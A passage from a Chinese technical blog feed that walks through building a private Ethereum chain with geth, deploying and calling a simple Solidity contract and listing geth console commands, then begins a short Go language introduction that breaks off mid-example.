class="string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span><br><span class="line">  <span class="string">"parentHash"</span>: <span class="string">"0x0000000000000000000000000000000000000000000000000000000000000000"</span>,</span><br><span class="line">  <span class="string">"timestamp"</span>: <span class="string">"0x00"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><em>注意！</em></strong></p><p>config参数请加上byzantiumBlock、constantinopleBlock、petersburgBlock，因为其实以太坊本身就要经历这四个阶段，如果不加的话，在0.5.5版本的solc之后，就会出问题，因为<a href="https://eips.ethereum.org/EIPS/eip-145" target="_blank" rel="noopener">EIP 145：EVM 中的按位移动（bitwise shifting）指令</a>，是constantinopleBlock版本的 ，这个SHR吧，从0.5.5版本开始，就被用来跟在CALLDATALOAD后面，（通过右移）用来取不同位数，所以，你要是在搭建私链的时候，很可能被坑，你的执行到SHR指令戛然而止Orz，从外部表现来看就是：”gas required exceeds allowance or always failing transaction”，当然这个Error大部分时候和这个问题没关系。</p><img src="geth-privatechain.assets/image-20191118210909048.png" alt="image-20191118210909048" style="zoom:50%"><p>初始化命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --datadir data0 init genesis.json</span><br></pre></td></tr></table></figure><p>命令的主体是 <code>geth init</code>，表示初始化区块链，命令可以带有选项和参数，其中 <code>--datadir</code> 选项后面跟一个目录名，这里为 data0，表示指定数据存放目录为 data0，genesis.json 是 <code>init</code> 命令的参数。初始化完成data0里面就会有初始化数据</p><h3 id="运行节点"><a href="#运行节点" class="headerlink" title="运行节点"></a>运行节点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 节点1</span></span><br><span class="line">geth --identity <span class="string">"TestNode0"</span> --rpc --rpcport <span class="string">"8545"</span> --rpccorsdomain <span class="string">"*"</span> --datadir data0 --port <span class="string">"30303"</span> --nodiscover --allow-insecure-unlock console</span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点2</span></span><br><span class="line">geth --datadir data1 init gensis.json</span><br><span class="line">geth --identity <span class="string">"TestNode1"</span> --rpc --rpcport <span class="string">"8546"</span> --rpccorsdomain <span class="string">"*"</span>  --datadir data1 --port <span class="string">"30304"</span> --nodiscover --allow-insecure-unlock console</span><br></pre></td></tr></table></figure><p>上面命令的主体是 <code>geth console</code>，表示启动节点并进入交互式控制台。<br>各选项含义如下：</p><ul><li>–identity：指定节点 ID；</li><li>–rpc：表示开启 HTTP-RPC 服务；</li><li>–rpcport：指定 HTTP-RPC 服务监听端口号（默认为 8545）；</li><li>–rpccorsdomain：允许rpc跨的域 (browser enforced)</li><li>–datadir：指定区块链数据的存储位置；</li><li>–port：指定和其他节点连接所用的端口号（默认为 30303）；</li><li>–nodiscover：关闭节点发现机制，防止加入有同样初始配置的陌生节点。</li></ul><p>一个节点可以有多个账户，默认0账户收钱(就上面定义的)，每次生成一个account，这个节点下面就会在文件夹keystone下生成一个文件，钥匙文件</p><blockquote><p>钥匙文件</p><p>每个账户都由一对钥匙定义，一个私钥和一个公钥。 账户以地址为索引，地址由公钥衍生而来，取公钥的最后 20个字节。每对私钥 /地址都编码在一个钥匙文件里。钥匙文件是JSON文本文件，可以用任何文本编辑器打开和浏览。钥匙文件的关键部分，账户私钥，通常用你创建帐户时设置的密码进行加密。钥匙文件可以在以太坊节点数据目录的keystore子目录下找到。</p><p><em>source: <a href="https://blog.csdn.net/wzygis/article/details/73480112" target="_blank" rel="noopener">https://blog.csdn.net/wzygis/article/details/73480112</a></em></p></blockquote><p>一旦进入console了，这是一个交互式的 JavaScript 执行环境，在这里面可以执行 JavaScript 代码，其中 <code>&gt;</code> 是命令提示符。在这个环境里也内置了一些用来操作以太坊的 JavaScript 对象，可以直接使用这些对象。这些对象主要包括：</p><ul><li>eth：包含一些跟<strong>操作区块链</strong>相关的方法；</li><li>net：包含一些查看<strong>p2p网络状态</strong>的方法；</li><li>admin：包含一些与<strong>管理节点</strong>相关的方法；</li><li>miner：包含启动&amp;停止<strong>挖矿</strong>的一些方法；</li><li>personal：主要包含一些<strong>管理账户</strong>的方法；</li><li>txpool：包含一些查看<strong>交易内存池</strong>的方法；</li><li>web3：包含了以上对象，还包含一些单位换算的方法。</li></ul><p>常用命令有，后面希望有更详细的一些：</p><ul><li>personal.newAccount()：创建账户；</li><li>personal.unlockAccount()：解锁账户；</li><li>eth.accounts：枚举系统中的账户；</li><li>eth.getBalance()：查看账户余额，返回值的单位是 Wei（Wei 是以太坊中最小货币面额单位，类似比特币中的<code>聪</code>，1 ether = 10^18 Wei）；</li><li>eth.blockNumber：列出区块总数；</li><li>eth.getTransaction(交易hash)：获取交易；</li><li>eth.getBlock()：获取区块；</li><li>miner.start()：开始挖矿；</li><li>miner.stop()：停止挖矿；</li><li>web3.fromWei()：Wei 换算成以太币；</li><li>web3.toWei()：以太币换算成 Wei；</li><li>txpool.status：交易池中的状态；</li><li>admin.addPeer()：连接到其他节点；</li></ul><p>这些命令支持 <code>Tab</code> 键自动补全</p><h3 id="节点网络"><a href="#节点网络" class="headerlink" title="节点网络"></a>节点网络</h3><h4 id="启动前添加"><a href="#启动前添加" class="headerlink" title="启动前添加"></a>启动前添加</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入节点目录下的geth文件夹</span></span><br><span class="line">&gt; <span class="built_in">cd</span> data0/geth</span><br><span class="line">&gt; gedit static-nodes.json <span class="comment"># 没有的话新建即可</span></span><br><span class="line">[</span><br><span class="line"><span class="string">"enode://xxxxx@[127.0.0.1]:30304"</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 最后正常启动即可</span></span><br></pre></td></tr></table></figure><h4 id="启动时添加"><a href="#启动时添加" class="headerlink" title="启动时添加"></a>启动时添加</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 节点连接：启动节点时添加</span></span><br><span class="line">&gt; geth --bootnodes enode://pubkey1@ip1:port1,enode://pubkey2@ip2:port2 --identity <span class="string">"TestNode0"</span> --rpc --rpcport <span class="string">"8545"</span> --datadir data0 --port <span class="string">"30303"</span> --nodiscover --allow-insecure-unlock console</span><br></pre></td></tr></table></figure><h4 id="启动后添加"><a href="#启动后添加" class="headerlink" title="启动后添加"></a>启动后添加</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 节点1：获取节点1信息</span></span><br><span class="line">&gt; admin.nodeInfo.enode</span><br><span class="line"><span class="string">"enode://略去数据@127.0.0.1:23332?discport=0"</span></span><br><span class="line"><span class="comment"># 节点2：查看节点2 peer数量</span></span><br><span class="line">&gt; net.peerCount</span><br><span class="line">0</span><br><span class="line">&gt; admin.addPeer(<span class="string">"enode://略去数据@127.0.0.1:23332?discport=0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点2的peer增加</span></span><br><span class="line">&gt; net.peerCount</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>如果出现admin.addPeer()返回true但是实际节点没有添加成功的例子，也即新增节点不生效，像这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; admin.addPeer(<span class="string">"enode://c4586276391b3c88ec23889d1bc825d0c7d69bd5765d4545686f835608068b8dc48799d2686a04ea0f9e17aed099bf9b56935679fa6493e9b17151624a320714@172.16.0.17:30303"</span>)</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; admin.peers</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>查看节点全信息，查找原因</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt; admin.nodeInfo</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">  ip: <span class="string">"::"</span>, <span class="comment">#这个ip应该不能是『::』如果是这个，在启动节点的时候去掉 --nodiscover选项</span></span><br><span class="line">  listenAddr: <span class="string">"[::]:30306"</span>,</span><br><span class="line">  name: <span class="string">"Geth/TestNode1/v1.9.0-unstable/darwin-amd64/go1.12.5"</span>,</span><br><span class="line">  ports: &#123;</span><br><span class="line">    discovery: 0,</span><br><span class="line">    listener: 30306</span><br><span class="line">  &#125;,</span><br><span class="line">  protocols: &#123;</span><br><span class="line">    eth: &#123;</span><br><span class="line">      config: &#123;</span><br><span class="line">        chainId: xxx,  <span class="comment"># 这个值要一致，如果不一致是无法添加成功的</span></span><br><span class="line">        ...</span><br><span class="line">        homesteadBlock: 0</span><br><span class="line">      &#125;,</span><br><span class="line">      difficulty: 1575808,</span><br><span class="line">      genesis: <span class="string">"0x62adc01b295219d7a4e1dade7648bf622f04e2b74aaaea3edfa3ad187ef59eed"</span>,</span><br><span class="line">      head: <span class="string">"0x43dc6aad82f2f7c208034ee103471e27a14c59e1cf07c2f124d345a377198c3c"</span>,</span><br><span class="line">      network: 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>对于这样一个demo:</p><figure class="highlight js"><figcaption><span>calc.sol</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.22</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"><span class="comment">//This is a calc you input to number and we will get the result</span></span><br><span class="line">contract calc&#123;</span><br><span class="line">    uint lastresult;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ADD</span>(<span class="params">uint _a,uint _b</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        uint c = _a + _b;</span><br><span class="line">        lastresult = c;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getLastResult</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lastresult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>geth智能合约发布需要bytecode和abi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In geth console</span></span><br><span class="line">&gt; bytecode=<span class="string">"0x---"</span> <span class="comment">#bin数据</span></span><br><span class="line">&gt; abi=[&#123;...&#125;] <span class="comment">#abi数据</span></span><br><span class="line">&gt; myContract = eth.contract(abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 评估gas消耗，决定gas写多少</span></span><br><span class="line">&gt; web3.eth.estimateGas(&#123;data: bytecode&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解锁节点以发布交易</span></span><br><span class="line">&gt; personal.unlockAccount(eth.accounts[0],<span class="string">'password'</span>,1000)</span><br><span class="line"></span><br><span class="line">&gt; contractInstance = myContract.new(&#123;data: bytecode gas: 1000000, from: eth.accounts[0]&#125;, <span class="keyword">function</span>(e, contract)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!e)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!contract.address)&#123;</span><br><span class="line">      console.log(<span class="string">"Contract transaction send: Transaction Hash: "</span>+contract.transactionHash+<span class="string">" waiting to be mined..."</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      console.log(<span class="string">"Contract mined! Address: "</span>+contract.address);</span><br><span class="line">      console.log(contract);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否在交易池中</span></span><br><span class="line">eth.getBlock(<span class="string">"pending"</span>, <span class="literal">true</span>).transactions</span><br><span class="line"></span><br><span class="line"><span class="comment">#节点3，挖矿</span></span><br><span class="line">&gt; miner.start(1);admin.sleepBlocks(1);miner.stop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查合约是否部署成功</span></span><br><span class="line">&gt; eth.getCode(contractInstance.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Success Info eg:</span></span><br><span class="line">&gt; Contract mined! Address: 0x22f72b784e8a076849154cc497ccb2c45560a140 [object Object]</span><br><span class="line">&gt; Contract mined! Address: 0xc966d0f4b171025b65598b22f3c3f4e84f2f8717 [object Object]</span><br></pre></td></tr></table></figure><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>可使用remix改善<strong>发布</strong>这个步骤，虽然改版了，但是差不多；注意gas可能会超过范围哦，修改下</p><p><img src="https://i.loli.net/2019/10/14/4goXWDjkercuOiA.png" alt="geth客户端发布-web3deploy"></p><p><img src="https://i.loli.net/2019/10/14/plY2uIvBzntrLUf.png" alt="Demo展示"></p><h3 id="智能合约的访问"><a href="#智能合约的访问" class="headerlink" title="智能合约的访问"></a>智能合约的访问</h3><p>当获取合约实例之后（比如 testInstance），在geth console中可以通过三种方法调用合约方法（比如testFunc）</p><ul><li><strong>testInstance.testFunc.sendTransaction();</strong></li><li><strong>testInstance.testFunc();</strong></li><li><strong>testInstance.testFunc.call();</strong></li></ul><p>本文将讲解这三种调用方法的区别</p><ul><li>testInstance.testFunc.sendTransaction(); 会创建一个交易，调用之后会返回一个交易hash值，它会广播到网络，等待矿工打包, 它会消耗gas。</li><li>testInstance.testFunc.call(); 它完全是一个本地调用，不会向区块链网络广播任何东西，它的返回值完全取决于 testFunc 方法的代码，不会消耗gas</li><li>testInstance.testFunc(); 它会比较特殊，由于有constant标识的方法不会修改状态变量，所以它不会被编译器执行。所以，如果testFunc() 有constant标识，它并不会被编译器执行，web3.js会执行call()的本地操作。相反如果没有constant标识，会执行sendTransaction()操作。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 得到address的智能合约实例</span></span><br><span class="line"><span class="keyword">var</span> contractInstance = web3.eth.contract(abi).at(address);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地：</span></span><br><span class="line">contractInstance.ADD.call(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line"><span class="comment">//13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变成交易</span></span><br><span class="line">contractInstance.ADD.sendTransaction(<span class="number">7</span>,<span class="number">6</span>,&#123;<span class="attr">from</span>:eth.accounts[<span class="number">0</span>]&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/14/qcnlLRYf1izTJ4p.png" alt="demo"></p><p>看下这个交易：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eth.getTransaction(<span class="string">"0xe9b9747a0e1cda6e4f46644e39e54cc2b7a78983311bddc654299d692217df72"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  blockHash: <span class="string">"0x2023067033d263a3f893b059466d80fb235a6ca6fd8c33e32ee430d8bfec7029"</span>,</span><br><span class="line">  blockNumber: <span class="number">109</span>,</span><br><span class="line">  <span class="keyword">from</span>: <span class="string">"0xc2ac34ff98de5040b6e4d8adc70cf5f70e09d217"</span>,</span><br><span class="line">  gas: <span class="number">42029</span>,</span><br><span class="line">  gasPrice: <span class="number">1000000000</span>,</span><br><span class="line">  hash: <span class="string">"0xe9b9747a0e1cda6e4f46644e39e54cc2b7a78983311bddc654299d692217df72"</span>,</span><br><span class="line">  input: <span class="string">"0xa87de9cc00000000000000000000000000000000000000000000000000000000000000070000000000000000000000000000000000000000000000000000000000000006"</span>,</span><br><span class="line">  nonce: <span class="number">2</span>,</span><br><span class="line">  r: <span class="string">"0xxxx"</span>,</span><br><span class="line">  s: <span class="string">"0xxxx"</span>,</span><br><span class="line">  to: <span class="string">"0xdac4e5626827029298266c244440419ff79455a9"</span>,</span><br><span class="line">  transactionIndex: <span class="number">0</span>,</span><br><span class="line">  v: <span class="string">"0x3ac"</span>,</span><br><span class="line">  value: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我想到了个问题，要是我没有abi怎么办，查了下资料，这个问题比较棘手。。。</p><h3 id="监听事件"><a href="#监听事件" class="headerlink" title="监听事件"></a>监听事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取事件对象</span></span><br><span class="line"><span class="keyword">var</span> myEvent = metacoin.Transfer();</span><br><span class="line"><span class="comment">// 监听事件，监听到事件后会执行回调函数</span></span><br><span class="line">myEvent.watch(<span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    myEvent.stopWatching();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//————————————————</span></span><br><span class="line"><span class="comment">//版权声明：本文为CSDN博主「今夕不惑」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span></span><br><span class="line"><span class="comment">//原文链接：https://blog.csdn.net/MisshqZzz/article/details/77834856</span></span><br></pre></td></tr></table></figure><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>更多：<a href="https://web3js.readthedocs.io/" target="_blank" rel="noopener">https://web3js.readthedocs.io</a></p><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><blockquote><p>admin.addPeer()</p></blockquote><p>连接节点，两个节点要要指定相同的 chainID</p><blockquote><p>admin.nodeInfo.enode</p></blockquote><p>知道节点信息</p><blockquote><p>admin.peers</p></blockquote><p>可以查看连接到的其他节点信息，</p><blockquote><p>net.peerCount</p></blockquote><p>可以查看已连接到的节点数量。</p><blockquote><p>eth.syncing</p></blockquote><p>节点同步；当CurrentBlock大于等于HighestBlock时会返回<strong>false</strong>，也就是同步完成之后，再执行eth.syncing()函数会返回false。</p><p>如果同步没完成，则显示以下字段：</p><ul><li>startingBlock：开始同步的起始区块编号；</li><li>currentBlock：当前正在导入的区块编号；</li><li>highestBlock：通过所链接的节点获得的当前最高的区块高度；</li><li>pulledStates：当前已经拉取的状态条目数；</li><li>knownStates：当前已知的待拉取的总状态条目数；</li></ul><h3 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h3><blockquote><p>personal.newAccount()</p></blockquote><p>创建账户，输入两遍密码即可；可以创建好多个，按照创建顺序，0，1，2，…账户，用<code>eth.accounts</code>可以枚举有多少，以及地址是啥</p><blockquote><p>eth.accounts()</p></blockquote><p>枚举该节点的所有账户，[“0x嘻嘻嘻嘻嘻嘻嘻”,”0x发发发发发”]</p><blockquote><p>eth.coinbase</p></blockquote><p>挖到一个区块会奖励5个以太币，挖矿所得的奖励会进入矿工的账户，这个账户叫做coinbase，默认情况下coinbase是本地账户中的第一个账户：</p><blockquote><p>eth.getBalance(eth.accounts[0])</p></blockquote><p>查看账户余额，可以单位换算以下，见下</p><blockquote><p>web3.fromWei(eth.getBalance(eth.accounts[1]),’ether’)</p></blockquote><p>以Wei为单位查看余额</p><blockquote><p>web3.eth.personal.unlockAccount(address, password, unlockDuraction [, callback])</p></blockquote><p>解锁账户，转账挖矿都需要解锁账户，如果解锁账户碰到这个问题”error-account-unlock-with-http-access-is-forbidden”，在启动geth console的时候可以加上参数”<strong>–allow-insecure-unlock</strong>“;</p><p>unlockDuration的时间应该是秒</p><p><a href="https://ethereum.stackexchange.com/questions/69435/error-account-unlock-with-http-access-is-forbidden-when-unlock-an-account-in-ge" target="_blank" rel="noopener">https://ethereum.stackexchange.com/questions/69435/error-account-unlock-with-http-access-is-forbidden-when-unlock-an-account-in-ge</a></p><blockquote><p>miner.setEtherbase()</p></blockquote><p>将其他账户设置成<code>coinbase</code>，比如<code>miner.setEtherbase(eth.accounts[1])</code></p><h3 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h3><blockquote><p>miner.start(1)</p></blockquote><p>其中 start 的参数表示挖矿使用的线程数。第一次启动挖矿会先生成挖矿所需的 DAG 文件，这个过程有点慢，等进度达到 100% 后，就会开始挖矿，此时屏幕会被挖矿信息刷屏。</p><blockquote><p>miner.stop()</p></blockquote><p>不解释</p><blockquote><p>miner.start(1);admin.sleepBlocks(1);miner.stop();</p></blockquote><p>一次只挖一个块</p><h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><blockquote><p>eth.blockNumber</p></blockquote><p>区块数量</p><blockquote><p>eth.getBlock( i )</p></blockquote><p>查看区块i的信息</p><blockquote><p>eth.getBlock(“pengding/[number]”).gasLimit</p></blockquote><p>Gas Limit就是一次交易中Gas的可用上限，在你提交交易之前，需要为交易设定一个Gas用量的上限。这个值一般写在gensis.json文件里，如果想提高gas，带上<code>--targetgaslimit xxxxx</code></p><h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><blockquote><p>eth.sendTransaction({from:eth.accounts[0],to:eth.accounts[1],value:amount})</p></blockquote><p>发送交易，这是一个简单的转账交易，后面有合约创建和合约交互</p><blockquote><p>txpool.status</p></blockquote><p>展示交易池</p><blockquote><p>eth.getBlock(“pending”, true).transactions</p></blockquote><p>查看当前待确认交易</p><blockquote><p>eth.getBlockTransactionCount(“pending”);</p></blockquote><p>查看当前待确认交易个数</p><blockquote><p>eth.getTransaction(“0x交易hash”)</p></blockquote><p>查看交易信息</p><blockquote><p>eth.estimatesGas({data: bytecode})</p></blockquote><p>评估bytecode的gas消耗</p><h3 id="单位换算"><a href="#单位换算" class="headerlink" title="单位换算"></a>单位换算</h3><blockquote><p>web3.toWei(5,’ether’)</p></blockquote><p>参考：</p><p><a href="https://g2ex.github.io/2017/09/12/ethereum-guidance/" target="_blank" rel="noopener">以太坊私链搭建</a></p><p><a href="https://www.8btc.com/article/144056" target="_blank" rel="noopener">以太坊(Ethereum)私链建立 、合约编译、部署完全教程(1)</a></p><p><a href="https://zhuanlan.zhihu.com/p/26089385" target="_blank" rel="noopener">深入解析以太坊中调用合约的三种方法</a></p><p><a href="https://blog.csdn.net/MisshqZzz/article/details/77834856" target="_blank" rel="noopener">在geth客户端调用已部署的智能合约</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> geth </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go半小时入坑</title>
      <link href="/2019/06/11/gobase/"/>
      <url>/2019/06/11/gobase/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>关于go的一些基础，也不是特别准确吧，不对请指出</p><a id="more"></a><h2 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h2><p>欲go必装go，go的安装，mac我觉得直接用brew命令很棒，也可以去官网下载</p><p>用<code>go env</code>查一下自己的一些配置</p><p><img src="https://i.loli.net/2019/09/23/xdNk52KuJYU9wib.png" alt="image-20190611162121830"></p><p>圈出来的，最好在<code>.bash_profile</code>下设置下吧</p><p>GOPATH这个主要是存放路径，路径下 <strong>bin</strong>存放编译后的可执行文件；<strong>pkg</strong>存放编译后的包文件；<strong>src</strong>存放项目源文件。</p><p>关于ide：如果是轻量级的食用，我觉得vscode就已经很棒了，idea装插件也很赞，我直接装的goland，也是jetbrains公司的，不免费(其实idea带插件就很不错)，方法自寻，学术免费，还是建议食用IDE，毕竟刚刚开始使用，我觉得成型的IDE免去很多麻烦，后续看看这些IDE都做了什么，安装了什么包，配置了什么，对以后手动配置和理解也很有帮助，也可以迅速步入正题。goland基本上进去会自动识别出来上面三个路径吧，尤其是gopath。</p><h2 id="Go的理解"><a href="#Go的理解" class="headerlink" title="Go的理解"></a>Go的理解</h2><h3 id="Go语言的类型系统"><a href="#Go语言的类型系统" class="headerlink" title="Go语言的类型系统"></a>Go语言的类型系统</h3><p>Go使用<strong>组合</strong>设计模式；不同于java的继承，两者应该是这样的</p><blockquote><p>继承：车（驾驶员） &lt;– 客车（乘客）&lt;– 货车（货物）</p></blockquote><blockquote><p>组合：货车（驾驶，载客，运货）</p></blockquote><p>除了Go本身的基础类型，用户定义类型，基本上就是包含一组带类型的字段，用来存储数据；</p><p>Go的接口用于对行为建模，而不是对象，比如Java，定义了Users接口，必须要声明引用该接口还要实现接口的所有方法；比如用户login()/logout()/changepass()…</p><p>而Go呢，Go就是，如果你实现了上述的方法，那就默认你这个类属于Users，也就是，可以存储在这个接口类型的实例中；而不需要声明引用了该接口；</p><p>并且，Go的接口一般都倾向于设计为单一行为；下面就是Go的io.Reader接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span>&#123;</span><br><span class="line">  Read(p []<span class="keyword">type</span>) (n <span class="keyword">int</span> err error)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// import packages</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// declare var</span></span><br><span class="line"><span class="keyword">var</span> myhellostring <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define functions</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span 